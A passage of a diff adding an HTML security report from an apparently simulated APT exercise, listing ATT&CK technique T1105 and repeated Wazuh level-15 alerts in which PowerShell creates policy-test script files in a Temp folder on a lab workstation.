+      &quot;seed_ready&quot;: true,
+      &quot;seed_reason&quot;: &quot;seed-ready&quot;
+    }
+  ],
+  &quot;incompatible&quot;: [],
+  &quot;missing&quot;: [],
+  &quot;noisy_only_mode&quot;: false,
+  &quot;seed_only_mode&quot;: false
+}</pre>
+<h2>Observed ATT&CK Techniques</h2>
+<table><tr><th>ATT&CK Technique</th><th>Mapped D3FEND techniques</th></tr>
+<tr><td><a href='https://attack.mitre.org/techniques/T1105/'>T1105</a></td><td>No mapped D3FEND technique found</td></tr>
+</table>
+<h2>Observed Wazuh Alerts</h2>
+<div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:06:41.362+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:06:41.362+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 29,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117201.1030453&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:06:39.2603375Z&quot;,
+        &quot;eventRecordID&quot;: &quot;463620&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:06:39.247\r\nProcessGuid: {d9a99926-238f-69ce-e90e-000000000600}\r\nProcessId: 6104\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qdiesxmy.1gd.ps1\r\nCreationUtcTime: 2026-04-02 08:06:39.247\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:06:39.247&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-238f-69ce-e90e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;6104&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_qdiesxmy.1gd.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:06:39.247&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:06:42Z&quot;
+}</pre></div><div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:07:33.237+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:07:33.237+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 30,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117253.1033230&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:07:31.1640068Z&quot;,
+        &quot;eventRecordID&quot;: &quot;463822&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:07:31.145\r\nProcessGuid: {d9a99926-23c3-69ce-ea0e-000000000600}\r\nProcessId: 6684\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_x503jz0p.kg2.ps1\r\nCreationUtcTime: 2026-04-02 08:07:31.145\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:07:31.145&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-23c3-69ce-ea0e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;6684&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_x503jz0p.kg2.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:07:31.145&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:07:33Z&quot;
+}</pre></div><div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:08:14.392+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:08:14.392+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 31,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117294.1036007&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:08:12.2493251Z&quot;,
+        &quot;eventRecordID&quot;: &quot;464028&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:08:12.233\r\nProcessGuid: {d9a99926-23ec-69ce-eb0e-000000000600}\r\nProcessId: 4316\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_t1irpt1d.nyq.ps1\r\nCreationUtcTime: 2026-04-02 08:08:12.233\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:08:12.233&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-23ec-69ce-eb0e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;4316&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_t1irpt1d.nyq.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:08:12.233&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:08:14Z&quot;
+}</pre></div><div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:09:03.041+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:09:03.041+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 32,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117343.1038784&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:09:00.9032122Z&quot;,
+        &quot;eventRecordID&quot;: &quot;464332&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:09:00.882\r\nProcessGuid: {d9a99926-241c-69ce-ec0e-000000000600}\r\nProcessId: 9808\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jcusvxs3.fnn.ps1\r\nCreationUtcTime: 2026-04-02 08:09:00.882\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:09:00.882&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-241c-69ce-ec0e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;9808&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_jcusvxs3.fnn.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:09:00.882&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:09:03Z&quot;
+}</pre></div><div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:09:49.050+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:09:49.050+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 33,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117389.1041561&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:09:48.9043298Z&quot;,
+        &quot;eventRecordID&quot;: &quot;464444&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:09:48.895\r\nProcessGuid: {d9a99926-244c-69ce-ed0e-000000000600}\r\nProcessId: 5168\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_efskroxf.crl.ps1\r\nCreationUtcTime: 2026-04-02 08:09:48.895\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:09:48.895&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-244c-69ce-ed0e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;5168&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_efskroxf.crl.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:09:48.895&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:09:49Z&quot;
+}</pre></div><div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:10:31.114+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:10:31.114+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 34,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117431.1044338&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:10:28.9468899Z&quot;,
+        &quot;eventRecordID&quot;: &quot;464780&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:10:28.942\r\nProcessGuid: {d9a99926-2474-69ce-ee0e-000000000600}\r\nProcessId: 9608\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qlarpasr.xnd.ps1\r\nCreationUtcTime: 2026-04-02 08:10:28.942\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:10:28.942&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-2474-69ce-ee0e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;9608&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_qlarpasr.xnd.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:10:28.942&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:10:31Z&quot;
+}</pre></div><div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:11:12.116+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:11:12.116+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 35,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117472.1047115&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:11:09.9626995Z&quot;,
+        &quot;eventRecordID&quot;: &quot;464964&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:11:09.957\r\nProcessGuid: {d9a99926-249d-69ce-ef0e-000000000600}\r\nProcessId: 6096\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_auq5t21u.kmv.ps1\r\nCreationUtcTime: 2026-04-02 08:11:09.957\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:11:09.957&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-249d-69ce-ef0e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;6096&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_auq5t21u.kmv.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:11:09.957&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:11:12Z&quot;
+}</pre></div><div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:12:08.070+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:12:08.070+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 36,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
